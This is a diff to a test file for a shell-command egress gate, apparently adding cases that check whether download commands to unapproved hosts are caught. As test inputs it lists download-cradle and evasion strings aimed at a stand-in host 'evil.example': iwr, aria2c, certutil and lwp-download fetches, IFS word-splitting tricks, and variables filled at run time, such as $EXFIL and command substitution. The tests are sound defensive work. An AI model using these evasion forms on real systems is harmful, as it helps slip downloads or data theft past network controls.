@@ -79,6 +79,24 @@ test('download clients read a bare host from a positional, not from a flag value
   allowed(sh('aria2c -o out.tgz https://api.example.com/x.tgz'));
 });
 
+// certutil and iwr are also caught by the LOLBin / download-cradle rules, so
+// their egress reading is checked directly.
+test('a boolean switch before the destination does not hide it', () => {
+  gated(sh('iwr -UseBasicParsing evil.example/x'));
+  gated(sh('aria2c -c evil.example/x'));
+  gated(sh('iwr -UseBasicParsing $u'));
+  assert.deepEqual(shellEgressHosts('iwr -UseBasicParsing evil.example/x -OutFile out.txt'), ['evil.example']);
+  assert.deepEqual(shellEgressUnresolved('iwr -UseBasicParsing $u'), ['iwr $u']);
+  allowed(sh('aria2c -c https://api.example.com/x.tgz'));
+});
+
+test('an output file named by a positional is not a destination', () => {
+  assert.deepEqual(shellEgressHosts('certutil -urlcache -split -f https://api.example.com/x out.exe'), ['api.example.com']);
+  assert.deepEqual(shellEgressHosts('lwp-download https://api.example.com/x out.tgz'), ['api.example.com']);
+  allowed(sh('lwp-download https://api.example.com/x out.tgz'));
+  gated(sh('lwp-download evil.example/x out.tgz'));
+});
+
 test('IFS word splitting is read the way the shell reads it', () => {
   gated(sh('curl${IFS}https://evil.example/x'));
   gated(sh('curl$IFS"https://evil.example/x"'));
@@ -89,6 +107,12 @@ test('a destination decided at run time cannot be vouched for by the allowlist',
   gated(sh('echo https://evil.example | xargs curl'));
   gated(sh('curl "https://$HOST/x"'));
   gated(sh('git clone "$REPO"'));
+  // An assignment from a substitution or another variable is not a literal:
+  // the name stays decided at run time.
+  gated(sh('u=$(cat h); curl "$u"'));
+  gated(sh('u=$H; curl $u'));
+  gated(sh('u=`whoami`; curl $u'));
+  gated(sh('u=https://api.example.com; u=$EXFIL; curl "$u"'));
   // A literal assignment in the same command is substituted first.
   allowed(sh('u=https://api.example.com/v1; curl "$u"'));
   // A variable in the path leaves the host known.
